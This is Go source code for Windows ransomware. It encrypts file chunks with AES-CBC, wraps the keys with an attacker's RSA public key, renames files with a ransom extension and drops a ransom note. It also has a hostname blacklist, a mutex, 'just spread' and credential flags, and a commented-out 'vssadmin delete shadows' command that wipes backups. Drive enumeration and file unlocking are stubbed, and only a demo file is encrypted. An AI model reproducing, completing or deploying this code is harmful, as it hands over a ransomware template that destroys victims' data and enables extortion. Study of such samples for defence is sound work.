package main


import (
  "flag"
  "os"
  //"os/exec"
  "log"
  "time"
  "sync/atomic"
  mathrand "math/rand"
  "strings"
  "strconv"
  "encoding/json"
  "encoding/hex"
  "encoding/pem"
  "crypto/x509"
  "crypto/rsa"
  "crypto/sha512"
  "crypto/cipher"
  "crypto/aes"
  cryptorand "crypto/rand"
  "path/filepath"
  "errors"
  "unsafe"
  "fmt"
  "golang.org/x/sys/windows"
)


// Limit structure
type Limit struct {
  LimitMB   int   `json:"limitMB"`
  Parts     int64 `json:"parts"`
  EachPart  int64 `json:"eachPart"`
}


// ConfigData structure
type ConfigData struct {
  Limits     []Limit        `json:"limits"`
  Extensions map[string]int `json:"extensions"`
  Names      map[string]int `json:"names"`
  Processes  []string       `json:"processes"`
  Hostnames  []string       `json:"hostnames"`
}


// Command line arguments
var ArgUsername *string
var ArgPassword *string
var ArgDomain *string
var ArgList *string
var ArgPath *string
var ArgThreads *int
var ArgAll *bool
var ArgNoMutex *bool
var ArgNoRansom *bool
var ArgForce *bool

// Config data
var Cfg ConfigData

// RSA public key
var PubKey *rsa.PublicKey

// Number of ecnrypted files
var numEncrypted int64


var (
  modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
  procCreateMutexW = modkernel32.NewProc("CreateMutexW")
)


const (
  // AES key Size
  AESKeySize = 16
  // AES IV Size
  AESIVSize = 16
  // AES block Size
  AESBlockSize = 16
)


// Main
func main() {

  mathrand.Seed(time.Now().UnixNano())

  // Command line arguments
  ArgUsername = flag.String("username", "", "username")

  ArgPassword = flag.String("password", "", "password")

  ArgDomain = flag.String("domain", "", "domain")

  ArgList = flag.String("list", "", "list")

  ArgPath = flag.String("path", "", "path")

  ArgThreads = flag.Int("t", -1, "threads")

  ArgAll = flag.Bool("all", false, "run on all without timeout counter")

  ArgNoMutex = flag.Bool("nomutex", false, "force not checking mutex")

  ArgNoRansom = flag.Bool("noransom", false, "Just spread/No Encryption")

  ArgForce = flag.Bool("force", false, "force blacklisted computers")

  json.Unmarshal([]byte(CfgData), &Cfg)

  flag.Parse()

  blackListed := false

  hostName, err := os.Hostname()
  if (err == nil) && !*ArgForce {
    for _, host := range Cfg.Hostnames {
      if (strings.Index(strings.ToLower(hostName),
                        strings.ToLower(host)) >= 0) ||
         (strings.Index(strings.ToLower(host),
                        strings.ToLower(hostName)) >= 0) {
        blackListed = true
        fmt.Println("blacklisted hostname")
      }
    }
  }

  if !*ArgNoRansom && !blackListed {
    Payload()
  }
}


// Payload
func Payload() {

  // Decode RSA key PEM data
  pubKeyPemData := []byte(PubKeyData)
  n, err := hex.Decode(pubKeyPemData, pubKeyPemData)
  if err != nil {
    log.Fatal(err.Error())
  }

  // Import RSA public key
  PubKey = ImportPubKey(pubKeyPemData[:n])

  // Create mutex
  _, err = CreateMutex(MutexName)
  if (err != nil) && !*ArgNoMutex {
    fmt.Println("Exiting due to another instance (You can run with --nomutex)")
    return
  }

  /*
  // Delete shadows
  go func() {
    cmd := exec.Command("vssadmin.exe", "delete", "shadows", "/all", "/Quiet")
    output, err := cmd.CombinedOutput()
    fmt.Println("Vssadmin delete", string(output))
    if err != nil {
      fmt.Println("vssadmin", err.Error())
    }
  }()
  */

  // Print status
  go func() {
    mins := 0
    for {
      time.Sleep(60 * time.Second)
      fmt.Println("Encrypted", numEncrypted, "files in", mins, "mins")
      mins++
    }
  }()

  t1 := time.Now()

  if (ArgPath != nil) && (len(*ArgPath) != 0) {

    // Encrypt path
    EncryptPath(*ArgPath, *ArgThreads)

    fmt.Println(time.Since(t1))

    return
  }

  // Get drive list
  _, err = GetDriveList()
  if err != nil {
    fmt.Println("Error getting drives", err.Error())
  }

  if (ArgAll == nil) || !*ArgAll {
    for i := 10; i != 0; i-- {
      fmt.Println("Encryption will run on all files in", i)
      time.Sleep(1 * time.Second)
    }
  }

  // Demo encrypt file
  DemoEncryptFile()

  fmt.Println(time.Since(t1))
}


// Import RSA public key
func ImportPubKey(pubKeyPemData []byte) *rsa.PublicKey {

  var err error

  block, _ := pem.Decode(pubKeyPemData)

  derData := block.Bytes

  if x509.IsEncryptedPEMBlock(block) {
    derData, err = x509.DecryptPEMBlock(block, nil)
    if err != nil {
      log.Print(err.Error())
    }
  }

  pub, err := x509.ParsePKIXPublicKey(derData)
  if err != nil {
    log.Print(err.Error())
  }

  pubKey, ok := pub.(*rsa.PublicKey)
  if !ok {
    log.Print("RSA not ok")
    return nil
  }

  return pubKey
}


// Create mutex
func CreateMutex(mutexName string) (uintptr, error) {

  mutexNameW := windows.StringToUTF16(mutexName)

  h, _, err := procCreateMutexW.Call(0, 0,
                                     uintptr(unsafe.Pointer(&mutexNameW[0])))
  if err != windows.ERROR_SUCCESS {
    return h, err
  }
  return h, nil
}


func GetDriveList() ([]string, error) {

  // :-)
  return nil, nil
}


// Encrypt path
func EncryptPath(path string, threads int) {

  // Demo encrypt file
  DemoEncryptFile()
}


// Demo encrypt file
func DemoEncryptFile() {

  // Encrypt file
  filePath, err := filepath.Abs("test.dat")
  if err != nil {
    filePath = "test.dat"
  }

  fileInfo, err := os.Stat(filePath)
  if err != nil {
    log.Print(err.Error())
    return
  }

  fileSize := fileInfo.Size()

  var parts, eachPart int64

  var limit Limit
  var i int

  for i, limit = range Cfg.Limits {
    limitSize := int64(limit.LimitMB) << 10
    if fileSize < limitSize {
      parts = limit.Parts
      eachPart = limit.EachPart
      break
    }
  }

  if i >= len(Cfg.Limits) {
    limit = Cfg.Limits[len(Cfg.Limits) - 1]
    parts = limit.Parts
    eachPart = limit.EachPart
  }

  EncryptFile(filePath, parts, eachPart)

  atomic.AddInt64(&numEncrypted, 1)

  ransomNotePath, err := filepath.Abs(RansomNoteName)
  if err != nil {
    ransomNotePath = RansomNoteName
  }

  // Write Ransom note
  f, err := os.OpenFile(ransomNotePath, os.O_RDWR | os.O_CREATE | os.O_TRUNC,
                        0666)
  defer f.Close()

  f.WriteString(RansomNote)
}


// Encrypt file
func EncryptFile(filePath string, parts, eachPart int64) {

  defer func() {
    r := recover()
    if r != nil {
      log.Print("!!!!!!!!!!!!!!!!!!!panic occurred but we continue...")
    }
  }()

  key := RandData(AESKeySize)
  iv := RandData(AESIVSize)

  // Encrypt file
  err := InternalEncryptFile(key, iv, filePath, parts, eachPart)
  if err != nil {
    log.Print(err.Error())
  }
}


// Encrypt file
func InternalEncryptFile(key, iv []byte, filePath string,
                         parts, eachPart int64) error {

  pos := strings.LastIndex(filePath, "\\")

  fileName := filePath[pos + 1:]

  newFileName := MakeRandStr(8) + strconv.FormatInt(time.Now().Unix(), 10) +
                 RansomExt

  newFilePath := filePath[:pos + 1] + newFileName

  err := os.Rename(filePath, newFilePath)
  if err != nil {
    if strings.Index(err.Error(), "another process") >= 0 {

      // Unlock file
      UnlockFile(filePath)

      err := os.Rename(filePath, newFilePath)
      if err != nil {
        fmt.Println("Failed to rename", filePath, "to", newFilePath)
        return err
      }

    } else {

      fmt.Println(err.Error(), filePath, newFilePath)
      return err
    }
  }

  f, err := os.OpenFile(newFilePath, os.O_RDWR, 0600)
  if err != nil {

    err = os.Chmod(newFilePath, 0222)
    if err != nil {
      fmt.Println(err.Error(), filePath, newFilePath)
      return err
    }

    f, err = os.OpenFile(newFilePath, os.O_RDWR, 0600)
    if err != nil {

      if strings.Index(err.Error(), "another process") >= 0 {

        // Unlock file
        UnlockFile(filePath)

        f, err = os.OpenFile(newFilePath, os.O_RDWR, 0600)
        if err != nil {
          fmt.Println(err.Error(), filePath, newFilePath)
          return err
        }

      } else {
        fmt.Println(err.Error(), filePath, newFilePath)
        return err
      }
    }
  }

  defer f.Close()

  fileInfo, err := f.Stat()

  fileSize := fileInfo.Size()

  blockSize := eachPart
  numBlocks := parts

  if (blockSize == -1) && (numBlocks == 1) {
    blockSize = fileSize
  }

  blockSize = (blockSize / AESBlockSize) * AESBlockSize

  buf := make([]byte, blockSize)

  if blockSize == 0 {
    return nil
  }

  blockStep := fileSize / numBlocks

  var i int64
  for i = 0; i < numBlocks; i++ {

    _, err := f.Read(buf)
    if err != nil {
      fmt.Println(err.Error())
      return err
    }

    f.Seek(-blockSize, 1)

    encData, err := AESEncrypt(key, iv, buf)
    if err != nil {
      fmt.Println(err.Error())
      return err
    }

    f.Write(encData)

    f.Seek(blockStep - blockSize, 1)
  }

  f.Seek(0, 2)

  // Encrypt original file name
  for (len(fileName) % AESBlockSize) != 0 {
    fileName += "|"
  }

  encFileName, err := AESEncrypt(key, iv, []byte(fileName))
  if err != nil {
    fmt.Println(err.Error())
    return err
  }

  // Write metadata
  metaData := []byte(EncMarker1)
  metaData = append(metaData, encFileName...)
  metaData = append(metaData, []byte(EncMarker2)...)
  f.Write(metaData)

  f.Seek(0, 2)

  // Write encrypted AES key and IV
  keyData := key
  keyData = append(keyData, iv...)
  encKeyData := RSAEncrypt(keyData, PubKey)
  f.Write(encKeyData)

  return nil
}


// Unlock file
func UnlockFile(filePath string) {
  // :-)
}


// AES encrypt data
func AESEncrypt(key, iv, data []byte) ([]byte, error) {

  if (len(data) % AESBlockSize) != 0 {
    return nil, errors.New("is")
  }

  cypher, err := aes.NewCipher(key)
  if err != nil { return nil, err }

  encData := make([]byte, len(data))

  mode := cipher.NewCBCEncrypter(cypher, iv)

  mode.CryptBlocks(encData, data)

  return encData, nil
}


// RSA-OAEP encrypt data
func RSAEncrypt(data []byte, pubKey *rsa.PublicKey) []byte {

  hash := sha512.New()

  rng := cryptorand.Reader

  encData, err := rsa.EncryptOAEP(hash, rng, pubKey, data, nil)
  if err != nil {
    log.Print(err.Error())
  }

  return encData
}


// Get random data
func RandData(size int) []byte {

  data := make([]byte, size)
  mathrand.Read(data)
  return data
}


// Make random string
func MakeRandStr(size int) string {

  const CharSet string =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

  s := make([]byte, size)
  for i := 0; i < size; i++ {
    n := mathrand.Intn(len(CharSet))
    s[i] = CharSet[n]
  }

  return string(s)
}
